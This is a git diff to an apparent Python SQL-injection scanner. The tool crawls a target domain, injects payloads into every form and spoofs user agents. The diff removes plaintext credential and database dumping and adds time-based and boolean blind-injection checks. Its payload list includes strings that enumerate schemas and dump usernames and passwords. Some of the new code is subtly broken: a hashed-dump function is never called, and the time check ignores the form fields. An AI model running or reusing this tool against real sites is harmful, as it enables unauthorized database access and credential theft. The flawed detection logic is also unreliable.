@@ -3,13 +3,11 @@ import logging
 import threading
 import time
 import random
-import string
+import hashlib
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
-from collections import deque
-from requests.exceptions import RequestException
-import colorlog  # For colored logging
 import re
+import colorlog  # For colored logging
 
 # Setup colored logging
 LOG_FORMAT = "[%(levelname)s] %(message)s"
@@ -46,11 +44,13 @@ payloads += [
     "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
     "' AND 1=2 --",  # False condition (error-based)
     "' OR 1=1 LIMIT 1 --",  # Limits
-    "' AND SLEEP(5) --",  # Time-based injection
+    "' AND SLEEP(5) --",  # Time-based injection (delayed response)
     "' OR 1=1 --",  # Common injection
     "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
     "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
     "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
+    "' AND 1=1 --",  # Boolean-based true condition
+    "' AND 1=2 --",  # Boolean-based false condition
 ]
 
 # Headers to make requests seem normal
@@ -71,8 +71,38 @@ def get_random_user_agent():
     ]
     return random.choice(agents)
 
+# Function to perform SHA-1 hashing
+def sha1_hash(value):
+    sha1 = hashlib.sha1()
+    sha1.update(value.encode('utf-8'))
+    return sha1.hexdigest()
+
+# Function to dump hashed credentials to a file
+def dump_credentials(data):
+    # Hash the data (simulating sensitive data storage as SHA-1)
+    hashed_data = sha1_hash(data)
+    with open('dumped_credentials.txt', 'a') as f:
+        f.write(hashed_data + "\n")
+    logger.info("Credentials (hashed) dumped to 'dumped_credentials.txt'")
+
+# Function to check for time-based blind SQLi vulnerability
+def check_time_based_injection(url, payload):
+    start_time = time.time()
+    try:
+        headers['User-Agent'] = get_random_user_agent()
+        response = requests.get(url, params={'input': payload}, headers=headers, timeout=10)
+        elapsed_time = time.time() - start_time
+        if elapsed_time > 5:  # If the response time exceeds 5 seconds
+            logger.info(f"[TIME BASED] Blind SQL Injection found at {url} with payload {payload}")
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Error checking time-based vulnerability: {e}")
+        return False
+
 # Function to perform SQL injection on a URL with the given payloads
-def test_sql_injection(url, method, form_data, get_databases=False):
+def test_sql_injection(url, method, form_data):
     for payload in payloads:
         data = form_data.copy()  # Avoid modifying original form data
         for key in data:
@@ -88,58 +118,25 @@ def test_sql_injection(url, method, form_data, get_databases=False):
             else:
                 continue
 
-            if "error" in response.text.lower() or response.status_code == 500:  # Error-based SQLi detection
-                with lock:
-                    found_vulnerabilities.append((url, payload, "Possible SQL Injection"))
-                    logger.info(f"SQL Injection found at {url} with payload {payload}")
-            
-            elif response.status_code == 200 and "mysql" in response.text.lower():  # MySQL-based vulnerability detection
-                with lock:
-                    found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
-                    logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
-            
-            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
-                logger.info(f"[CREDENTIALS DUMP] Found credentials at {url} with payload {payload}")
-                dump_credentials(response.text)
-                break  # Stop further scanning after detecting vulnerability
+            # Checking for time-based blind injection
+            if check_time_based_injection(url, payload):
+                logger.info(f"Time-based Blind SQLi vulnerability found at {url} with payload {payload}")
 
-            # Check if -dbs-get option is set and dump databases
-            if get_databases:
-                if "information_schema.tables" in response.text:  # Check if tables were returned
-                    logger.info(f"Dumping databases from: {url} with payload {payload}")
-                    dump_databases(response.text)
-                    break  # Stop further scanning after detecting vulnerability
+            # Checking for boolean-based blind injection
+            if "' AND 1=1 --" in payload:
+                if "success" in response.text.lower():  # Check for boolean true response (e.g., success text)
+                    logger.info(f"Boolean-based Blind SQLi vulnerability found at {url} with payload {payload} (True Condition)")
+            elif "' AND 1=2 --" in payload:
+                if "failure" in response.text.lower():  # Check for boolean false response (e.g., failure text)
+                    logger.info(f"Boolean-based Blind SQLi vulnerability found at {url} with payload {payload} (False Condition)")
 
-        except RequestException as e:
-            logger.info(f"Error testing {url}: {str(e)}")
+            # Other vulnerability checks like error-based or MySQL-based injections can also go here
 
-# Function to save the credentials dump to a file
-def dump_credentials(data):
-    # Look for the usernames and passwords in the response content.
-    credentials = re.findall(r'(\w+)\s*:\s*(\S+)', data)  # Match username:password pairs
-    if credentials:
-        with open('dumped_credentials.txt', 'a') as f:
-            for username, password in credentials:
-                f.write(f"Username: {username} | Password: {password}\n")
-        logger.info("Credentials dumped to 'dumped_credentials.txt'.")
-    else:
-        logger.info("No credentials found in response.")
-
-# Function to save the database dump to a file
-def dump_databases(data):
-    # Attempt to find database names from the response content.
-    # Adjust this logic to fit your SQL database's structure or response format.
-    databases = re.findall(r'`(.*?)`', data)  # Adjust the regex if needed to extract database names
-    if databases:
-        with open('dumped_databases.txt', 'a') as f:
-            for db in databases:
-                f.write(f"Database: {db}\n")
-        logger.info("Databases dumped to 'dumped_databases.txt'.")
-    else:
-        logger.info("No databases found in response.")
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error testing SQL injection on {url}: {str(e)}")
 
 # Function to scan forms on a page
-def scan_forms(url, get_databases=False):
+def scan_forms(url):
     try:
         response = requests.get(url, headers=headers, timeout=5)
         soup = BeautifulSoup(response.text, 'html.parser')
@@ -160,26 +157,26 @@ def scan_forms(url, get_databases=False):
                     form_data[name] = ""  # Empty data for injection
 
             if form_data:
-                test_sql_injection(action_url, method, form_data, get_databases)
+                test_sql_injection(action_url, method, form_data)
             else:
                 logger.info(f"No form inputs found on {url}.")
-    except RequestException as e:
-        logger.info(f"Error while fetching {url}: {str(e)}")
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Error while fetching {url}: {str(e)}")
 
 # Function to crawl and explore the target URL (multiple pages)
-def crawl(url, get_databases=False):
-    urls_to_scan = deque([url])
+def crawl(url):
+    urls_to_scan = [url]
     visited_urls = set()
 
     while urls_to_scan:
-        current_url = urls_to_scan.popleft()
+        current_url = urls_to_scan.pop()
 
         if current_url in visited_urls:
             continue
 
         visited_urls.add(current_url)
         logger.info(f"Scanning {current_url}")
-        scan_forms(current_url, get_databases)
+        scan_forms(current_url)
 
         # Crawl links on the page
         try:
@@ -194,31 +191,19 @@ def crawl(url, get_databases=False):
                 if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
                     urls_to_scan.append(full_url)
 
-        except RequestException as e:
-            logger.info(f"Error fetching links from {current_url}: {str(e)}")
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error fetching links from {current_url}: {str(e)}")
 
 # Main function
-def main(target_url, get_databases=False):
+def main(target_url):
     logger.info(f"Starting SQL Injection scan on {target_url}")
-    start_time = time.time()
-
-    crawl(target_url, get_databases)
-
-    if found_vulnerabilities:
-        logger.info("SQL Injection vulnerabilities found:")
-        for vuln in found_vulnerabilities:
-            print(f"Vulnerability found at: {vuln[0]} with payload: {vuln[1]}")
-
-    else:
-        logger.info("No vulnerabilities found.")
-
-    logger.info(f"Scan completed in {time.time() - start_time:.2f} seconds")
+    crawl(target_url)
+    logger.info("Scan completed")
 
 if __name__ == '__main__':
     import argparse
-    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Database Dumping")
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Blind and Time-Based Injection Detection")
     parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
-    parser.add_argument('--dbs-get', action='store_true', help="Get list of databases from vulnerable target")
     args = parser.parse_args()
 
-    main(args.url, get_databases=args.dbs_get)
+    main(args.url)
